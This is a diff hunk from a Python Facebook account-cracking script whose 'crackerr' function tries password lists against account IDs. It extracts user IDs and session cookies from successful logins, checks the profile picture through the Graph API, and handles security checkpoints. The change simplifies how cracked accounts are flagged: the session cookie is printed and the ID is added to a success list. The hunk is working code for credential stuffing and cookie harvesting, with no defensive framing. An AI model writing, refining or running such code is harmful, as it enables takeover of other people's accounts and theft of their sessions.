@@ -527,16 +527,10 @@ def crackerr(ids,passlist):
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                     final_response = session.get(response.headers.get('Location', url), allow_redirects=True) if 'Location' in response.headers else response
-                     email_confirm_indicators = ["confirmemail.php" in final_response.url, "confirmemail.php" in response.url, "/confirmemail/" in final_response.url, "confirm_email" in final_response.url, "verify_email" in final_response.url, "confirmation/email" in final_response.url, "confirm-email" in final_response.url, "confirmemail.php" in final_response.text, "confirm your email" in final_response.text.lower(), "verify your email" in final_response.text.lower(), "email confirmation" in final_response.text.lower(), "confirm email address" in final_response.text.lower(), "verification code" in final_response.text.lower() and "email" in final_response.text.lower(), '"confirm_email":true' in final_response.text, '"requires_email_confirmation":true' in final_response.text, '"email_confirmation"' in final_response.text]
-                     if any(email_confirm_indicators):
-                           print(f"{green}nvvv : {green}{kuki}")
-                           oks.append(user)
-                           break
-                     else:
-                           print(f"{green}okkk : {green}{kuki}")
-                           break
+                if 'Photoshop' in res:   
+                  print(f"{green}nvvv : {green}{kuki}")
+                  oks.append(user)
+                  break    
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
